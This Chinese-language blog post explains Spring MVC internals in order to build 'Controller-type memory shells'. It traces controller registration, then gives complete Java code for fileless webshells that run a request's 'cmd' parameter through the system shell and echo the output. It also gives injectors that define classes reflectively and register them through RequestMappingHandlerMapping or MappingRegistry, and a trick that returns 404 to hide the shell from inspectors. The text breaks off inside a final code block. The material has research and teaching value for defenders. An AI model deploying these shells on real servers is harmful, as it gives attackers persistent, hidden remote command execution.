---
title: Controller型内存马
date: 2026-06-25 08:02:39
updated: 2026-06-29 02:47:06
tags:
  - Web
  - 内存马
  - Spring内存马
---
> 参考文章：
> 
> [SpringMVC源码之Controller查找原理 - 卧颜沉默 - 博客园](https://www.cnblogs.com/w-y-c-m/p/8416630.html)
> 
> [基于内存 Webshell 的无文件攻击技术研究-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/198886)
> 
> [Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)
> 
> [JavaWeb 内存马一周目通关攻略 | 素十八](https://su18.org/post/memory-shell/)

# Bean

Bean 是 Spring 框架的一个**核心概念**，它是构成应用程序的主干，并且是由 `Spring IoC` 容器负责实例化、配置、组装和管理的对象。

-   bean 是对象
-   bean 被 IoC 容器管理
-   Spring 应用主要是由一个个的 bean 构成的

# IOC容器

如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。

IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用`xml`、`Java注解`或`Java代码`来表示。

# ApplicationContext

Spring 框架中，`BeanFactory` 接口是 `Spring` **IoC容器** 的实际代表者

Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374372751-d1267eef-2176-4544-a038-b8bf41598b7f.png)

因此，`org.springframework.context.ApplicationContext`接口也代表了 `IoC容器` ，它负责实例化、定位、配置应用程序中的对象(`bean`)及建立这些对象间(`beans`)的依赖。

# Root Context和Child Context

在正式了解上面的配置前，先介绍下关于 Root Context 和 Child Context 的重要概念：

-   Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context
-   所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean
-   所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中

每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。

如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext。

## ContextLoaderListener

ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。

回到 web.xml 中，其相关配置如下：

```xml
<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/applicationContext.xml</param-value>
</context-param>

<listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
</listener>
```

依照规范，当没有显式配置 ContextLoaderListener 的 contextConfigLocation 时，程序会自动寻找 /WEB-INF/applicationContext.xml，作为配置文件，所以其实上面的 <context-param> 标签对其实完全可以去掉。

## DispatcherServlet

DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。

从下面的继承关系图中可以发现： DispatcherServlet 从本质上来讲是一个 Servlet（扩展了 HttpServlet )。

回到 web.xml 中，其相关配置如下：

```xml
<servlet>
  <servlet-name>dispatcherServlet</servlet-name>
  <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
  <init-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/dispatcherServlet-servlet.xml</param-value>
  </init-param>
  <load-on-startup>1</load-on-startup>
</servlet>
```

上面给 org.springframework.web.servlet.DispatcherServlet 类设置了个别名 dispatcherServlet ，并配置了它的 contextConfigLocation 参数值为 /WEB-INF/dispatcherServlet-servlet.xml。

依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找 /WEB-INF/<servlet-name>\-servlet.xml，作为配置文件。因为上面的 <servlet-name> 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件。


综上，可以了解到：每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。

如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext。

```plain
                    ┌─────────────────────────────────┐
                    │        ServletContext           │
                    │                                 │
                    │  ┌────────────────────────────┐ │
                    │  │ Root ApplicationContext    │ │
                    │  │  (全局唯一)         				│ │
                    │  │  - Service Bean            │ │
                    │  │  - Dao Bean                │ │
                    │  └──────────┬─────────────────┘ │
                    │             │                   │
                    │  ┌──────────▼─────────────────┐ │
                    │  │ Child ApplicationContext   │ │
                    │  │(每个DispatcherServlet一个)	│ │
                    │  │  - Controller Bean         │ │
                    │  │  - 视图解析器               	│ │
                    │  └────────────────────────────┘ │
                    └─────────────────────────────────┘
```

# 流程分析

在之前我们分析`Servlet`内存马的时候，到最后注册流程可以简单归纳为做了两件事情：`Servlet`本身的实现和`Servlet`与`ServletMapping`映射，而今天的主题`Controller`也与此类似，`Controller`的注册除了需要自己本身的实现还需要完成`RequestMapping`映射。

首先我们需要知道一个`Controller`是如何被注册到内存中运行，继续以前面的`HelloController`代码为例，在`AbstractHandlerMethodMapping#initHandlerMethods`处打上断点  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463176740-9d4fd16f-414e-412c-a618-c3fa2109c674.png)

在该方法中，通过`this.getCandidateBeanNames()`方法获取到所有的 Bean 并进行遍历，接着调用了`processCandidateBean()`方法，跟进该方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463176847-2635a7b5-6b5f-4251-9d48-7d1624e7bc7f.png)

在`processCandidateBean()`方法中获取了对应的 Bean 类型并通过`isHandler()`方法做了判断，最后再调用`detectHandlerMethods()`方法，我们看看`isHandler()`方法具体做了什么判断  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463176934-0ddbe51e-0f26-426d-974a-425b0b393591.png)

可以清晰的看到这里通过`isHandler()`方法去判断传入的 Bean 类型是否为`Controller`或者是否被`RequestMapping`注解所修饰。回到`processCandidateBean()`方法，我们继续看最后的`detectHandlerMethods()`方法又做了哪些事情​  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177034-40e16803-4492-4d1f-ba2c-a073f916c665.png)

首先通过全类名获取了`HelloController`类的实例，接着又遍历获取了`HelloController`类中的方法存到 Map 对象 methods 中，接着调用`getMappingForMethod()`方法，我们继续跟进去  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177137-3eed1d33-b55d-44d5-8702-6018edf96d86.png)

在`getMappingForMethod()`方法中，首先调用了`createRequestMappingInfo()`方法，先跟进去`createRequestMappingInfo()`方法看看  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177243-f05bbfe5-7370-4f64-9de2-0ec9d63c8d94.png)

继续跟进`this.createRequestMappingInfo()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177333-d63dd1da-f4d6-4417-9b38-bcb4c1539361.png)

继续跟进`builder.options(this.config).build();`  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177463-cccfd139-b73e-4b01-b63a-ef1858671407.png)

到这里完成`RequestMappingInfo`对象的创建，至此可以清楚的了解到`getMappingForMethod()`方法做的事情：通过解析`Controller`类方法中的注解，生成一个`RequestMappingInfo`对象用于存储访问对应方法的 URL 映射信息。

接着回到`detectHandlerMethods()`方法，看到最后调用了`registerHandlerMethod()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177644-cf1f31d9-32c5-4175-89ce-56cf3bd4ea4c.png)

跟进`registerHandlerMethod()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177793-41594995-0a25-46e8-949d-8c08c8c19183.png)

继续跟进  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177876-60cdeb4f-4866-4241-b4c0-abc83be4f522.png)

跟进`MappingRegistry#register()`方法  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463177952-575a298d-1977-4b8a-ab4f-9ae4ce5937a7.png)

可以看到，在`register()`方法中将传入的`RequestMappingInfo`对象、`handler`名称和对应的`method`方法进行映射和包装处理并添加，相关属性如下图所示  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782463178057-3580e61d-97e2-44b0-9889-f71b5339be10.png)

到这里，基本就走完了一个`Controller`的注册流程。

# 实现思路

和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下

1.  获取上下文环境
2.  注册恶意Controller
3.  配置路径映射

# 获取上下文环境Context

有四种方法

## getCurrentWebApplicationContext

```java
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

如下图， getCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。

注意这里及下面实现方法中的 Root WebApplicationContext 都是后文的一个伏笔。

![image-005.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782442083715-1034b05c-7e78-47a0-913d-8abe025de2e6.png)

## WebApplicationContextUtils

```java
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦，其实拆分起来比较容易理解，主要是用 WebApplicationContextUtils的

```java
public static WebApplicationContext getWebApplicationContext(ServletContext sc)
```

方法来获得当前上下文环境。其中 WebApplicationContextUtils.getWebApplicationContext 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。

剩余部分代码，都是用来获得 ServletContext 类的一个实例。仔细研究后可以发现，上面的代码完全可以简化成下面 RequestContextUtils 中的代码。

## RequestContextUtils

```java
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

上面的代码使用 RequestContextUtils 的

```java
public static WebApplicationContext getWebApplicationContext(ServletRequest request)
```

方法，通过 ServletRequest 类的实例来获得 WebApplicationContext 。

如下图，可以发现此方法获得的是一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。这个 dispatcherServlet-servlet 其实是上面配置中 dispatcherServlet-servlet.xml 的文件名。

![image-006.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782442251526-179cdce3-8618-4191-9f5f-136f065b9083.png)

进一步分析，代码中有个 RequestContextHolder.currentRequestAttributes() ，在前置知识中已经提到过

所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中

然后如下图，查看当前所有的 attributes，发现确实保存有 Context 的属性名。

其中 org.springframework.web.servlet.DispatcherServlet.CONTEXT 和 org.springframework.web.servlet.DispatcherServlet.THEME\_SOURCE 属性名中都存放着一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext 。

![image-007.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782442277913-6c87c9f7-cd81-4a19-990d-f5dfd9c114d0.png)

## getAttribute

```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

从方法三的分析来看，其实完全可以将存放在 ServletContext 属性中的 Context 取出来直接使用。在阅读相关源码后发现，上面代码中的 currentRequestAttributes() 替换成 getRequestAttributes() 也同样有效；getAttribute 参数中的 0代表从当前 request 中获取而不是从当前的 session 中获取属性值。

因此，使用以上代码也可以获得一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。

## LiveBeansView

因为 org.springframework.context.support.LiveBeansView 类在 spring-context 3.2.x 版本才加入其中，所以低版本无法通过此方法获得 ApplicationContext 的实例。

```java
//反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
//属性被 private 修饰，所以setAccessible true
filed.setAccessible(true);
//获取一个 ApplicationContext 实例
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782380744579-8d716d97-cb65-4877-82a3-7992a0500928.png)

**​**  

**注意事项**

不同的映射处理器

如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。

```java
<bean class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping" />
<bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter" />
```

上文展示的5种获得当前代码运行时的上下文环境的方法中，推荐使用后面3种方法获得 Child WebApplicationContext。解释如下：

> 根据习惯，在很多应用配置中注册Controller 的 component-scan 组件都配置在类似的 dispatcherServlet-servlet.xml 中，而不是全局配置文件 applicationContext.xml 中。
> 
> 这样就导致 RequestMappingHandlerMapping 的实例 bean 只存在于 Child WebApplicationContext 环境中，而不是 Root WebApplicationContext 中。上文也提到过，Root Context无法访问Child Context中定义的 bean，所以可能会导致 Root WebApplicationContext 获得不了 RequestMappingHandlerMapping 的实例 bean 的情况。
> 
> 另外，在有些Spring 应用逻辑比较简单的情况下，可能没有配置 ContextLoaderListener 、也没有类似 applicationContext.xml 的全局配置文件，只有简单的 servlet 配置文件，这时候通过前两种方法是获取不到Root WebApplicationContext的。

# 动态注册Controller

Spring Controller 的动态注册，就是对 `RequestMappingHandlerMapping` 注入的过程。

`RequestMappingHandlerMapping`是springMVC里面的核心Bean，spring把我们的controller解析成`RequestMappingInfo`对象，然后再注册进`RequestMappingHandlerMapping`中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。

-   RequestMappingHandlerMapping对象本身是spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。
-   在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的 `org.springframework.web.context.ContextLoaderListener` ，由它来完成IOC容器的初始化和bean对象的注入。
-   另外一个是ApplicationContext是由 `org.springframework.web.servlet.DispatcherServlet` 完成的，具体是在 `org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()` 这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。

如下图：Spring 3.2.5 处理 URL 映射相关的类都实现了 HandlerMapping 接口。

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782439143507-490edc65-7c1e-42c9-a621-71afef0dc9d6.png)

Spring 2.5 开始到 Spring 3.1 之前一般使用`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`映射器 ；

Spring 3.1 开始及以后一般开始使用新的`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`映射器来支持@Contoller和@RequestMapping注解。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374372877-cf3c0ffd-31e8-40c4-90b6-bd99a278033b.png)

## registerMapping

在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping

```java
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```

## registerHandler

参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类

```java
org.springframework.web.servlet.handler.AbstractUrlHandlerMapping
```

进入查看代码，发现其中有一个registerHandler 方法，摘录关键部分如下：

```java
protected void registerHandler(String urlPath, Object handler) throws BeansException, IllegalStateException {
    ...
    Object resolvedHandler = handler;
    if (!this.lazyInitHandlers && handler instanceof String) {
        String handlerName = (String)handler;
        if (this.getApplicationContext().isSingleton(handlerName)) {
            resolvedHandler = this.getApplicationContext().getBean(handlerName);
        }
    }
    Object mappedHandler = this.handlerMap.get(urlPath);
    if (mappedHandler != null) {
        if (mappedHandler != resolvedHandler) {
            throw new IllegalStateException("Cannot map " + this.getHandlerDescription(handler) + " to URL path [" + urlPath + "]: There is already " + this.getHandlerDescription(mappedHandler) + " mapped.");
            ...
        } else {
            this.handlerMap.put(urlPath, resolvedHandler);
            if (this.logger.isInfoEnabled()) {
                this.logger.info("Mapped URL path [" + urlPath + "] onto " + this.getHandlerDescription(handler));
            }
        }
    }
```

该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中。

```java
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

## detectHandlerMethods

参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类

```java
org.springframework.web.servlet.handler.AbstractHandlerMethodMapping
```

进入查看代码，发现其中有一个detectHandlerMethods 方法，代码如下：

```java
protected void detectHandlerMethods(Object handler) {
    Class<?> handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();
    final Class<?> userType = ClassUtils.getUserClass(handlerType);
    Set<Method> methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {
        public boolean matches(Method method) {
            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;
        }
    });
    Iterator var6 = methods.iterator();
    while(var6.hasNext()) {
        Method method = (Method)var6.next();
        T mapping = this.getMappingForMethod(method, userType);
        this.registerHandlerMethod(handler, method, mapping);
    }
}
```

该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean。

示例代码如下：

```java
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```

## MappingRegistry#register

MappingRegistry#register 是底层注册入口。部分 Spring Boot 2.6 以后版本启用了 PathPattern 相关配置，直接构造 RequestMappingInfo 时可能需要带上 BuilderConfiguration。

```java
// 通过 context 获取 RequestMappingHandlerMapping 对象
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

// 获取父类的 MappingRegistry 属性
Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
f.setAccessible(true);
Object mappingRegistry = f.get(mappingHandlerMapping);

//路径映射绑定
Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
configField.setAccessible(true);

// springboot 2.6.x之后的版本需要pathPatternsCondition
RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).options(config).build();

// 反射调用 MappingRegistry 的 register 方法
Class c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
Method[] methods = c.getDeclaredMethods();
for(Method method :methods)
{
    if ("register".equals(method.getName())) {
        // 反射调用 MappingRegistry 的 register 方法注册
        method.setAccessible(true);
        method.invoke(mappingRegistry, requestMappingInfo, myClass.newInstance(), myClass.getMethods()[0]);
    }
}
```

这种方式更底层，兼容性处理空间更大，但对 Spring 内部字段层级和版本差异更敏感。

# 实现恶意Controller

下面提供一个简单的用来执行命令回显的 Webshell 代码示例：

```java
package org.example.springdemo.demos.web;

import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.Writer;
import java.util.Scanner;

@Controller
public class ControllerShellClass {

    @RequestMapping("/favicon")
    public void login(HttpServletRequest request, HttpServletResponse response, Writer writer) throws IOException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {

                    String o = "";
                    java.lang.ProcessBuilder p;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                    } else {
                        p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
                    }
                    InputStream in = p.start().getInputStream();
                    Scanner scanner = new Scanner(in).useDelimiter("\\A");
                    o = scanner.hasNext() ? scanner.next() : o;
                    scanner.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }else {
            System.out.println("404");
            response.sendError(404);
        }
    }

}

```

代码比较简单，达到的效果是，当请求没有携带指定的参数(code)时，返回 404 错误，当没有经验的人员检查时，因为 Webshell 仅存在于内存中，直接访问又是 404 状态码，所以很可能会认为 Webshell 不存在或者没有异常了。

```java
package org.example.springdemo.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

@Controller
public class EvilController {
    @ResponseBody
    @RequestMapping("/controller")
    public String SayHello(HttpServletRequest req, HttpServletResponse resp) {
        try {
            String path = "/favicon";
            byte[] classBytes = Util.getClassBytes(ControllerShellClass.class);
            //String s = Util.base64Encode(classBytes);
            //System.out.println(s);

            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), classBytes, 0, classBytes.length);

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

            Field f = requestMappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(requestMappingHandlerMapping);

            Field configF = requestMappingHandlerMapping.getClass().getDeclaredField("config");
            configF.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configF.get(requestMappingHandlerMapping);
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).options(config).build();

            Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method[] methods = c.getDeclaredMethods();
            for (Method method : methods) {
                if ("register".equals(method.getName())) {
                    method.setAccessible(true);
                    method.invoke(mappingRegistry, requestMappingInfo, clazz.newInstance(), clazz.getMethods()[0]);
                    System.out.println("1111111");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "controller memshell!";
    }
}

```
```java
package org.example.springdemo.demos.web;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.lang.reflect.Method;

public class Util {
    public static byte[] getClassBytes(Class clazz) throws Exception {
        ClassPool cp = ClassPool.getDefault();
        cp.insertClassPath(new ClassClassPath(clazz));
        CtClass cc = cp.get(clazz.getName());
        cc.getClassFile().setMajorVersion(50);
        byte[] bytes = cc.toBytecode();

        cc.defrost();

        return bytes;
    }
    public static String base64Encode(byte[] bytes) throws Exception {
        String result;

        try {
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getEncoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("encodeToString", byte[].class);
            obj = method.invoke(obj, bytes);
            result = (String) obj;
        } catch (ClassNotFoundException e) {
            Class clazz = Class.forName("sun.misc.BASE64Encoder");
            Method method = clazz.getMethod("encodeBuffer", byte[].class);
            Object obj = method.invoke(clazz.newInstance(), bytes);
            result = (String) obj;
            result = result.replaceAll("\r|\n|\r\n", "");
        }

        return result;
    }
}

```

## 1

对应的恶意方法

```java
public class Controller_Shell{

    public Controller_Shell(){}

    public void shell() throws IOException {

        //获取request
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
}
```
```java
package com.shell.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@Controller
public class shell_controller {

    //    @ResponseBody
    @RequestMapping("/control")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```

首先访问`/control`路由，由于Controller默认会将结果交给View处理，返回值通常会被解析成一个页面路径，所以这里会报404错误。我们可以使用`@ResponeBody`来将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374372954-0bbc3e2a-7283-4665-b578-06cbbe185a18.png)

然后访问我们定义恶意Controller的路由`/shell`

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782374373033-1be5337e-b4e8-436f-b7f2-ed93e29254d9.png)

## 2

剩下的就是动手编写动态注入`Controlller`内存马的实现代码，先编写一个恶意代码类

```java
package com.memoryshell.spring;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * Created by dotast on 2022/12/2 12:16
 */
public class ControllerEvilClass {

    public void shell(HttpServletRequest request, HttpServletResponse response) throws Exception{
        try{
            String cmd = request.getParameter("cmd");
            if(cmd != null){
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                ByteArrayOutputStream bao = new ByteArrayOutputStream();
                byte[] bytes = new byte[1024];
                int a = -1;
                while((a = inputStream.read(bytes))!=-1){
                    bao.write(bytes,0,a);
                }
                response.getWriter().write(new String(bao.toByteArray()));
            }else {
                response.sendError(404);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

然后将`ControllerEvilClass`类字节码经过 base64 编码以用于接下来的实现类

```java
package com.study.springdemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
